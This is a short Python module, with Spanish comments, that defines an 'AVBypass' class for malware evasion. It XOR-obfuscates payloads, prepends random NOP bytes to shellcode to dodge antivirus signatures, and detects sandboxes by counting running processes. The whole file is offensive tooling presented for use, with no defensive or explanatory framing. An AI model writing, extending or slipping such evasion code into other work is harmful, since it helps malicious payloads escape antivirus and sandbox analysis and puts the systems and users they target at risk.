import base64
import random

class AVBypass:
    @staticmethod
    def xor_encrypt(payload, key=0x3A):
        """Ofusca payloads con XOR."""
        return bytes([b ^ key for b in payload])

    @staticmethod
    def generate_poly_shellcode(shellcode):
        """Añade código basura para evadir firmas."""
        junk = [b"\x90" * random.randint(1, 5)]  # NOPs aleatorios
        return b''.join(junk) + shellcode

    @staticmethod
    def check_sandbox():
        """Detecta entornos sandbox."""
        import psutil
        return len(psutil.pids()) < 50  # Sandbox típico tiene pocos procesos
